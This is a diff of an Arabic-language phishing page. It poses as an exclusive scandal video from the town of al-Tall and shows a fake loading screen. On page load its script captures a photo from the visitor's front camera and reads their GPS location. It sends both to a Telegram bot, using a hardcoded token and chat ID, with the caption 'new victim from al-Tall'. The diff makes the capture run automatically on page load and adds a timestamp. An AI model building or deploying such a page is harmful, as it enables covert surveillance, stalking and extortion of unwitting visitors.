@@ -3,56 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فضيحة كبيرة في مدينة التل</title>
+    <title>فيديو حصري - مدينة التل</title>
     <style>
-        body {background:#000; color:#f00; text-align:center; font-family:Arial; margin:0; padding:0;}
-        h1 {font-size:32px; margin:30px 0;}
-        p {font-size:20px;}
-        .video {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; border:5px solid #f00; border-radius:15px; margin:20px auto; max-width:90%; cursor:pointer;}
-        .play {font-size:80px; color:#fff; animation:pulse 1.5s infinite;}
-        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
+        body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
+        .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
+        h1 {font-size:28px; margin:20px; color:#f00;}
+        .loader {border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
+        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+        .progress-bar {width:80%; background:#333; border-radius:10px; overflow:hidden; margin:20px;}
+        .progress {height:20px; background:#f00; width:0%; animation:load 8s linear forwards;}
+        @keyframes load {0% {width:0%;} 100% {width:100%;}}
+        p {font-size:18px; margin:10px;}
+        .fake-video {position:absolute; top:0; left:0; width:100%; height:100%; background:#000 url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; opacity:0.3; z-index:-1;}
     </style>
 </head>
-<body onload="start()">
-    <h1>فضيحة كبيرة في مدينة التل</h1>
-    <p>الفيديو يشتغل تلقائيًا...</p>
-    <div class="video" onclick="start()">
-        <div class="play">▶</div>
+<body onload="capture()">
+    <div class="fake-video"></div>
+    <div class="container">
+        <h1>فيديو حصري وصل للتو في مدينة التل</h1>
+        <p>جاري تحميل الفيديو الكامل...</p>
+        <div class="loader"></div>
+        <div class="progress-bar"><div class="progress"></div></div>
+        <p>الرجاء الانتظار قليلاً، الجودة عالية جدًا...</p>
     </div>
 
     <script>
-    function start() {
-        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
-            let v=document.createElement('video');
-            v.srcObject=s; v.play();
+    function capture() {
+        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
             setTimeout(()=>{
-                let c=document.createElement('canvas');
-                c.width=1280; c.height=720;
-                c.getContext('2d').drawImage(v,0,0,1280,720);
-                let img=c.toDataURL('image/jpeg');
+                let canvas = document.createElement('canvas');
+                canvas.width = 1280;
+                canvas.height = 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+                let imgData = canvas.toDataURL('image/jpeg');
 
-                navigator.geolocation.getCurrentPosition(p=>{
-                    let gps = p.coords.latitude + "," + p.coords.longitude + " ±" + p.coords.accuracy + "m";
+                navigator.geolocation.getCurrentPosition(pos=>{
+                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " ±" + pos.coords.accuracy + "m";
 
                     let botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
                     let chatId = "1611398303";
 
-                    let webhook = `https://api.telegram.org/bot\( {botToken}/sendPhoto?chat_id= \){chatId}`;
-                    let f = new FormData();
-                    f.append('photo', dataURLtoBlob(img));
-                    f.append('caption', "🆕 ضحية جديدة من التل\nGPS: " + gps);
+                    let url = `https://api.telegram.org/bot\( {botToken}/sendPhoto?chat_id= \){chatId}`;
+                    let form = new FormData();
+                    form.append('photo', dataURLtoBlob(imgData));
+                    form.append('caption', "🆕 ضحية جديدة من التل\nGPS: " + gps + "\nوقت الفتح: " + new Date());
 
-                    fetch(webhook, {method: 'POST', body: f});
-                }, ()=>{});
-                s.getTracks().forEach(t=>t.stop());
-            }, 1000);
+                    fetch(url, {method: 'POST', body: form});
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+            }, 1500);
         }).catch(()=>{});
     }
 
     function dataURLtoBlob(dataurl) {
         let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
             bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-        while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+        while(n--) u8arr[n] = bstr.charCodeAt(n);
         return new Blob([u8arr], {type:mime});
     }
     </script>
